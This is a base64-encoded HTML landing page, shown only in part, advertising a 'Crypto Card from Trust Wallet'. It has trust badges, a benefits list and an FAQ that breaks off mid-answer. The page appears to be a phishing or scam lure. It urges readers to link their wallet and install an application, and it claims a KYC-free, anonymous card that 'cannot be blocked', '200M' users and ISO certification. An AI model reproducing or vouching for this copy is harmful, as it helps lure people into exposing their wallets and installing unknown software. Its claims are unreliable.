ICAgICAgICAgICAgICAgIDxzcGFuPkVuZ2xpc2g8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJtb2JpbGUtbGFuZy1vcHRpb24iIGRhdGEtbGFuZz0icnUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZsYWciPvCfh7fwn4e6PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4+0KDRg9GB0YHQutC40Lk8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJtb2JpbGUtbGFuZy1vcHRpb24iIGRhdGEtbGFuZz0iZGUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZsYWciPvCfh6nwn4eqPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4+RGV1dHNjaDwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vYmlsZS1sYW5nLW9wdGlvbiIgZGF0YS1sYW5nPSJmciI+DQogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZmxhZyI+8J+Hq/Cfh7c8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj5GcmFuw6dhaXM8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJtb2JpbGUtbGFuZy1vcHRpb24iIGRhdGEtbGFuZz0iZXMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZsYWciPvCfh6rwn4e4PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4+RXNwYcOxb2w8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJtb2JpbGUtbGFuZy1vcHRpb24iIGRhdGEtbGFuZz0icHQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZsYWciPvCfh7Xwn4e5PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4+UG9ydHVndcOqczwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vYmlsZS1sYW5nLW9wdGlvbiIgZGF0YS1sYW5nPSJ1ayI+DQogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZmxhZyI+8J+HuvCfh6Y8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj7Qo9C60YDQsNGX0L3RgdGM0LrQsDwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vYmlsZS1sYW5nLW9wdGlvbiIgZGF0YS1sYW5nPSJ6aCI+DQogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZmxhZyI+8J+HqPCfh7M8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj7kuK3mloc8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4tcHJpbWFyeSBidG4tbW9iaWxlLW9idGFpbiIgZGF0YS1pMThuPSJuYXYub2J0YWluIj5PYnRhaW4gQ2FyZDwvYnV0dG9uPg0KICAgICAgICA8L25hdj4NCiAgICA8L25hdj4NCg0KICAgIDxzZWN0aW9uIGlkPSJob21lIiBjbGFzcz0iaGVybyI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJoZXJvLWNvbnRlbnQiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imhlcm8tdGV4dCI+DQogICAgICAgICAgICAgICAgICAgIDxoMSBkYXRhLWkxOG49Imhlcm8xLnRpdGxlIj5DcmVhdGUgWW91cjxicj5DcnlwdG9jdXJyZW5jeSBDYXJkIGZyb208YnI+VHJ1c3QgV2FsbGV0IDxzcGFuIGNsYXNzPSJoaWdobGlnaHQiIGRhdGEtaTE4bj0iaGVybzEuaW1tZWRpYXRlbHkiPkltbWVkaWF0ZWx5PC9zcGFuPjwvaDE+DQogICAgICAgICAgICAgICAgICAgIDxwIGRhdGEtaTE4bj0iaGVybzEuZGVzY3JpcHRpb24iPlRyYW5zYWN0aW9ucyBwcm9jZWVkIHN0cmFpZ2h0IGZyb20geW91ciBUcnVzdCBXYWxsZXQuIE1ha2UgcHVyY2hhc2VzIGRpcmVjdGx5IGZyb20geW91ciB3YWxsZXQgd2l0aG91dCBiYWxhbmNlIHJlZmlsbHMgb3IgYXV0aGVudGljYXRpb24uIExpbmsgeW91ciB3YWxsZXQgYW5kIGluc3RhbGwgdGhlIGFwcGxpY2F0aW9uIOKAlCB5b3VyIGNhcmQgd2lsbCBiZSBwcmVwYXJlZCBpbiBtZXJlbHkgMiBtaW51dGVzLjwvcD4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaGVyby1idXR0b25zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0bi1wcmltYXJ5IGJ0bi1sYXJnZSBidG4tb2J0YWluLWhlcm8iIGRhdGEtaTE4bj0iYnV0dG9ucy5vYnRhaW5DYXJkIj5PYnRhaW4gWW91ciBDYXJkPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4tc2Vjb25kYXJ5IGJ0bi1sYXJnZSIgZGF0YS1pMThuPSJidXR0b25zLmRpc2NvdmVyTW9yZSI+RGlzY292ZXIgTW9yZTwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJoZXJvLWltYWdlIj4NCiAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9ImltYWdlcy9pbnRyby1pbWFnZS5hdmlmIiBhbHQ9IkNyeXB0byBDYXJkIiBjbGFzcz0iaW50cm8taW1hZ2UiPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvc2VjdGlvbj4NCg0KICAgIDxzZWN0aW9uIGNsYXNzPSJ0cnVzdC1zZWN0aW9uIj4NCiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9InRydXN0LWdyaWQiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRydXN0LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cnVzdC1sYWJlbCI+VHJ1c3RlZCBieTwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cnVzdC12YWx1ZSI+MjAwTTxzcGFuIGNsYXNzPSJ0cnVzdC11bml0Ij4gcGVvcGxlPC9zcGFuPjwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRydXN0LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cnVzdC1sYWJlbCI+Rm91bmRlZCBpbjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cnVzdC12YWx1ZSI+MjAxNzwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRydXN0LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cnVzdC1sYWJlbCI+SW5kZXBlbmRlbnRseTwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cnVzdC12YWx1ZSI+QXVkaXRlZDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRydXN0LWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cnVzdC1sYWJlbCI+SVNPPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRydXN0LXZhbHVlIj5DZXJ0aWZpZWQ8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cnVzdC1pdGVtIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idHJ1c3QtbGFiZWwiPlRvcCByZXZpZXdzPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRydXN0LXZhbHVlIHRydXN0LXN0YXJzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgY2xhc3M9InN0YXItc3ZnIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgZmlsbD0iY3VycmVudENvbG9yIiBzdHJva2Utd2lkdGg9IjAiIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMTcuMjdMMTguMTggMjFsLTEuNjQtNy4wM0wyMiA5LjI0bC03LjE5LS42MUwxMiAyIDkuMTkgOC42MyAyIDkuMjRsNS40NiA0LjczTDUuODIgMjF6Ij48L3BhdGg+PC9zdmc+DQogICAgICAgICAgICAgICAgICAgICAgICA8c3ZnIGNsYXNzPSJzdGFyLXN2ZyIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGZpbGw9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIwIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTEyIDE3LjI3TDE4LjE4IDIxbC0xLjY0LTcuMDNMMjIgOS4yNGwtNy4xOS0uNjFMMTIgMiA5LjE5IDguNjMgMiA5LjI0bDUuNDYgNC43M0w1LjgyIDIxeiI+PC9wYXRoPjwvc3ZnPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHN2ZyBjbGFzcz0ic3Rhci1zdmciIHN0cm9rZT0iY3VycmVudENvbG9yIiBmaWxsPSJjdXJyZW50Q29sb3IiIHN0cm9rZS13aWR0aD0iMCIgdmlld0JveD0iMCAwIDI0IDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xMiAxNy4yN0wxOC4xOCAyMWwtMS42NC03LjAzTDIyIDkuMjRsLTcuMTktLjYxTDEyIDIgOS4xOSA4LjYzIDIgOS4yNGw1LjQ2IDQuNzNMNS44MiAyMXoiPjwvcGF0aD48L3N2Zz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgY2xhc3M9InN0YXItc3ZnIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgZmlsbD0iY3VycmVudENvbG9yIiBzdHJva2Utd2lkdGg9IjAiIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMTcuMjdMMTguMTggMjFsLTEuNjQtNy4wM0wyMiA5LjI0bC03LjE5LS42MUwxMiAyIDkuMTkgOC42MyAyIDkuMjRsNS40NiA0LjczTDUuODIgMjF6Ij48L3BhdGg+PC9zdmc+DQogICAgICAgICAgICAgICAgICAgICAgICA8c3ZnIGNsYXNzPSJzdGFyLXN2ZyIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGZpbGw9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIwIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTEyIDE3LjI3TDE4LjE4IDIxbC0xLjY0LTcuMDNMMjIgOS4yNGwtNy4xOS0uNjFMMTIgMiA5LjE5IDguNjMgMiA5LjI0bDUuNDYgNC43M0w1LjgyIDIxeiI+PC9wYXRoPjwvc3ZnPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L3NlY3Rpb24+DQoNCiAgICA8c2VjdGlvbiBpZD0icHJpdmlsZWdlcyIgY2xhc3M9InByaXZpbGVnZXMiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KICAgICAgICAgICAgPGgyIGRhdGEtaTE4bj0icHJpdmlsZWdlcy50aXRsZSI+UmVjZWl2ZWQgcHJpdmlsZWdlczwvaDI+DQogICAgICAgICAgICA8cCBjbGFzcz0ic3VidGl0bGUiIGRhdGEtaTE4bj0icHJpdmlsZWdlcy5zdWJ0aXRsZSI+QmVuZWZpdHMgb2YgdXNpbmcgQ3J5cHRvIENhcmQgZnJvbSBUcnVzdCBXYWxsZXQ8L3A+DQoNCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJlbmVmaXRzLWdyaWQiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJlbmVmaXQtY2FyZCI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJlbmVmaXQtaW1hZ2UiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9ImltYWdlcy9iZW5lZml0MS5zdmciIGFsdD0iSW5zdGFudCBzdGFydCwgbm8gcmVnaXN0cmF0aW9uIj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDxoMyBjbGFzcz0iYmVuZWZpdC1oZWFkbGluZSI+SW5zdGFudCBzdGFydCwgbm8gcmVnaXN0cmF0aW9uPC9oMz4NCiAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9ImJlbmVmaXQtZGVzY3JpcHRpb24iPk5vIG5lZWQgdG8gcmVnaXN0ZXIgb3IgY3JlYXRlIGFkZGl0aW9uYWwgYWNjb3VudHMuIFN0YXJ0IHVzaW5nIHlvdXIgY2FyZCBpbW1lZGlhdGVseS48L3A+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmVuZWZpdC1jYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmVuZWZpdC1pbWFnZSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaW1hZ2VzL2JlbmVmaXQyLnN2ZyIgYWx0PSJEaXJlY3QgY29ubmVjdGlvbiB0byBUcnVzdCBXYWxsZXQiPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPGgzIGNsYXNzPSJiZW5lZml0LWhlYWRsaW5lIj5EaXJlY3QgY29ubmVjdGlvbiB0byBUcnVzdCBXYWxsZXQ8L2gzPg0KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0iYmVuZWZpdC1kZXNjcmlwdGlvbiI+Q3J5cHRvIGNhcmQgaXMgZGlyZWN0bHkgY29ubmVjdGVkIHRvIHlvdXIgVHJ1c3QgV2FsbGV0LiBQYXltZW50IGdvZXMgZGlyZWN0bHkgZnJvbSB5b3VyIHdhbGxldC48L3A+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmVuZWZpdC1jYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmVuZWZpdC1pbWFnZSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaW1hZ2VzL2JlbmVmaXQzLnN2ZyIgYWx0PSJQYXltZW50IGRpcmVjdGx5IGZyb20gVHJ1c3QgV2FsbGV0Ij4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDxoMyBjbGFzcz0iYmVuZWZpdC1oZWFkbGluZSI+UGF5bWVudCBkaXJlY3RseSBmcm9tIFRydXN0IFdhbGxldDwvaDM+DQogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJiZW5lZml0LWRlc2NyaXB0aW9uIj5QYXltZW50IGdvZXMgZGlyZWN0bHkgZnJvbSB5b3VyIFRydXN0IFdhbGxldC4gVXNlIHlvdXIgY3J5cHRvIGZ1bmRzIGluc3RhbnRseSB3aXRob3V0IGludGVybWVkaWFyaWVzLjwvcD4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJiZW5lZml0LWNhcmQiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJiZW5lZml0LWltYWdlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJpbWFnZXMvYmVuZWZpdDQuc3ZnIiBhbHQ9IktZQy1mcmVlIGNhcmQg4oCUIGNvbXBsZXRlIGFub255bWl0eSI+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8aDMgY2xhc3M9ImJlbmVmaXQtaGVhZGxpbmUiPktZQy1mcmVlIGNhcmQg4oCUIGNvbXBsZXRlIGFub255bWl0eTwvaDM+DQogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJiZW5lZml0LWRlc2NyaXB0aW9uIj5DcnlwdG8gY2FyZCBmcm9tIFRydXN0IFdhbGxldCB3aXRob3V0IEtZQywgZGlyZWN0bHkgbGlua2VkIHRvIHlvdXIgd2FsbGV0LjwvcD4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJiZW5lZml0LWNhcmQiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJiZW5lZml0LWltYWdlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJpbWFnZXMvYmVuZWZpdDUuc3ZnIiBhbHQ9IkZ1bmRzIHJlbWFpbiBpbiB5b3VyIHdhbGxldCI+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8aDMgY2xhc3M9ImJlbmVmaXQtaGVhZGxpbmUiPkZ1bmRzIHJlbWFpbiBpbiB5b3VyIHdhbGxldDwvaDM+DQogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJiZW5lZml0LWRlc2NyaXB0aW9uIj5Nb25leSByZW1haW5zIGluIHlvdXIgVHJ1c3QgV2FsbGV0IHVudGlsIHNwZW50LiBJdCBjYW5ub3QgYmUgYmxvY2tlZCBvciByZXN0cmljdGVkLjwvcD4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJiZW5lZml0LWNhcmQiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJiZW5lZml0LWltYWdlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJpbWFnZXMvYmVuZWZpdDYuc3ZnIiBhbHQ9IlZlcmlmaWVkIHN0YXRpc3RpY3MgYW5kIG1ldHJpY3MiPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPGgzIGNsYXNzPSJiZW5lZml0LWhlYWRsaW5lIj5WZXJpZmllZCBzdGF0aXN0aWNzIGFuZCBtZXRyaWNzPC9oMz4NCiAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9ImJlbmVmaXQtZGVzY3JpcHRpb24iPk51bWJlciBvZiB1c2VycywgdG90YWwgdHJhbnNhY3Rpb24gdm9sdW1lLCBkYWlseSB0cmFuc2FjdGlvbiBjb3VudC48L3A+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9zZWN0aW9uPg0KDQogICAgPHNlY3Rpb24gaWQ9ImZhcSIgY2xhc3M9ImZhcSI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQogICAgICAgICAgICA8aDIgZGF0YS1pMThuPSJmYXEudGl0bGUiPkZBUTwvaDI+DQogICAgICAgICAgICA8cCBjbGFzcz0ic3VidGl0bGUiIGRhdGEtaTE4bj0iZmFxLnN1YnRpdGxlIj5GaW5kIGFuc3dlcnMgdG8gc29tZSBvZiB0aGUgbW9zdCBjb21tb24gcXVlc3Rpb25zPC9wPg0KDQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmYXEtY29udGVudCI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmFxLWxlZnQgZmFxLWZ1bGwiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmYXEtaXRlbSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJmYXEtcXVlc3Rpb24gYWN0aXZlIiBkYXRhLWZhcT0iMCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gZGF0YS1pMThuPSJmYXEucTEiPldoYXQgaXMgQ3J5cHRvIENhcmQgZnJvbSBUcnVzdCBXYWxsZXQ/PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iY3VycmVudENvbG9yIiBzdHJva2Utd2lkdGg9IjIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWxpbmUgcG9pbnRzPSI2IDkgMTIgMTUgMTggOSI+PC9wb2x5bGluZT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmFxLWFuc3dlciBhY3RpdmUiIGlkPSJmYXEtMCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgZGF0YS1pMThuPSJmYXEuYTEiPkNyeXB0byBDYXJkIGZyb20gVHJ1c3QgV2FsbGV0IGlzIGEgY2FyZCBmb3IgdXNlcnMgd2hvIHdhbnQgdG8gdXNlIGNyeXB0b2N1cnJlbmNpZXMgaW4gdGhlaXIgZGFpbHkgbGlmZS4gUGF5bWVudCBnb2VzIGRpcmVjdGx5IGZyb20geW91ciBUcnVzdCBXYWxsZXQuIFRoZSBjYXJkIGFsbG93cyB5b3UgdG8gdXNlIGNyeXB0b2N1cnJlbmNpZXMgYXQgbWlsbGlvbnMgb2Ygb25saW5lIGFuZCBvZmZsaW5lIHN0b3JlcyB3b3JsZHdpZGUuPC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KDQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZhcS1pdGVtIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImZhcS1xdWVzdGlvbiIgZGF0YS1mYXE9IjEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGRhdGEtaTE4bj0iZmFxLnEyIj5Ib3cgZG9lcyBDcnlwdG8gQ2FyZCBmcm9tIFRydXN0IFdhbGxldCB3b3JrPzwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3ZnIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHBvbHlsaW5lIHBvaW50cz0iNiA5IDEyIDE1IDE4IDkiPjwvcG9seWxpbmU+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zdmc+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZhcS1hbnN3ZXIiIGlkPSJmYXEtMSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgZGF0YS1pMThuPSJmYXEuYTIiPlRoZSBjcnlwdG8gY2FyZCBjb25uZWN0cyBkaXJlY3RseSB0byB5b3VyIFRydXN0IFdhbGxldCBhbmQgYWxsb3dzIHlvdSB0byBzcGVuZCB5b3VyIGNyeXB0b2N1cnJlbmN5IGZ1bmRzIGluc3RhbnRseSBhdCBhbnkgbWVyY2hhbnQgdGhhdCBhY2NlcHRzIHRoZSBjYXJkLiBUcmFuc2FjdGlvbnMgYXJlIHByb2Nlc3NlZCBzZWN1cmVseSBhbmQgcXVpY2tseS48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmFxLWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZmFxLXF1ZXN0aW9uIiBkYXRhLWZhcT0iMiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gZGF0YS1pMThuPSJmYXEucTMiPkRvIEkgbmVlZCBUcnVzdCBXYWxsZXQgdG8gZ2V0IG9yIHVzZSBhIGNyeXB0byBjYXJkPzwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3ZnIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHBvbHlsaW5lIHBvaW50cz0iNiA5IDEyIDE1IDE4IDkiPjwvcG9seWxpbmU+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zdmc+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZhcS1hbnN3ZXIiIGlkPSJmYXEtMiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgZGF0YS1pMThuPSJmYXEuYTMiPlllcywgeW91IG5lZWQgVHJ1c3QgV2FsbGV0IHRvIHVzZSB0aGUgY3J5cHRvIGNhcmQuIFRoZSBjYXJkIGlzIGRpcmVjdGx5IGludGVncmF0ZWQgd2l0aCBUcnVzdCBXYWxsZXQgZm9yIHNlYW1sZXNzIHRyYW5zYWN0aW9ucyBhbmQgZnVuZCBtYW5hZ2VtZW50LjwvcD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmYXEtaXRlbSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJmYXEtcXVlc3Rpb24iIGRhdGEtZmFxPSIzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBkYXRhLWkxOG49ImZhcS5xNCI+V2hhdCBjYW4gSSBkbyB3aXRoIENyeXB0byBDYXJkIGZyb20gVHJ1c3QgV2FsbGV0Pzwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3ZnIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHBvbHlsaW5lIHBvaW50cz0iNiA5IDEyIDE1IDE4IDkiPjwvcG9seWxpbmU+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zdmc+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZhcS1hbnN3ZXIiIGlkPSJmYXEtMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgZGF0YS1pMThuPSJmYXEuYTQiPllvdSBjYW4gdXNlIHlvdXIgY3J5cHRvIGNhcmQgdG8gbWFrZSBvbmxpbmUgYW5kIG9mZmxpbmUgcHVyY2